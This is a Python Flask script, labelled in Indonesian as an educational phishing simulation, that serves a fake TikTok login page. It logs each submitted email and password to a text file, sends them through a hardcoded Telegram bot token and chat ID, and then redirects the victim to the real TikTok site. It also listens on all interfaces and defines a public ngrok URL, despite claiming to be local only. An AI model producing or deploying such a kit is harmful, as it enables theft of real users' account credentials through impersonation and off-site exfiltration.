from flask import Flask, render_template_string, request, redirect, url_for
from datetime import datetime
import requests
url = "https://numeric-kathi-uncommodious.ngrok-free.dev/"
app = Flask(__name__)
app.config['SECRET_KEY'] = 'RahasiaDong'
LOGFILE = "bngst.txt"

def kirim_telegram(pesan):
    TOKEN = "8224200110:AAFrEtDFqGvDKIYtI1bvH6R5KzjkMU5iwok"
    CHAT_ID = "5731440724"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": pesan,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=payload)
        print("✅ Telegram terkirim." if response.status_code == 200 else f"❌ Gagal: {response.text}")
    except Exception as e:
        print(f"❌ Error Telegram: {e}")

login_page = """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login TikTok</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0; font-family: 'Roboto', sans-serif;
      background-color: #000; color: #fff;
      display: flex; justify-content: center; align-items: center; height: 100vh;
    }
    .login-container {
      background-color: #121212; padding: 40px 30px; border-radius: 12px;
      width: 360px; box-shadow: 0 0 20px rgba(255,255,255,0.05); text-align: center;
    }
    .logo img { width: 60px; margin-bottom: 20px; }
    h2 { font-size: 22px; margin-bottom: 20px; font-weight: 700; }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 12px; margin: 10px 0;
      border: none; border-radius: 6px; background-color: #2c2c2c;
      color: #fff; font-size: 14px;
    }
    input[type="submit"] {
      background-color: #ee1d52; color: white; padding: 12px;
      width: 100%; border: none; border-radius: 6px;
      font-weight: bold; font-size: 15px; cursor: pointer;
      margin-top: 10px; transition: background-color 0.3s ease;
    }
    input[type="submit"]:hover { background-color: #c51743; }
    .links { margin-top: 15px; font-size: 14px; }
    .links a { color: #ee1d52; text-decoration: none; }
    .links a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="{{ url_for('static', filename='TikTok.png') }}" alt="TikTok Logo">
    </div>
    <h2>Masuk ke TikTok</h2>
    <form action="/submit" method="POST">
      <input type="text" name="email" placeholder="Email atau Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="submit" value="Masuk" />
    </form>
    <div class="links">
      <p><a href="#">Lupa kata sandi?</a></p>
      <p>Belum punya akun? <a href="#">Daftar sekarang</a></p>
    </div>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(login_page)

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    ts = datetime.utcnow().isoformat() + "Z"

    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(f"{ts}\tEMAIL:{email}\tPASSWORD:{password}\n")

    notif = f"""📢 <b>SIMULASI PHISHING</b>
🕒 <b>Waktu:</b> {ts}
📧 <b>Email:</b> {email}
🔒 <b>Password:</b> {password}
📁 <i>Log disimpan ke:</i> {LOGFILE}"""

    kirim_telegram(notif)
    return redirect("https://www.tiktok.com")

if __name__ == "__main__":
    print("=== SIMULASI PHISHING EDUKATIF ===")
    print("Buka http://127.0.0.1:5000 di browser (hanya lokal).")
    app.run(host="0.0.0.0", port=5000, debug=True)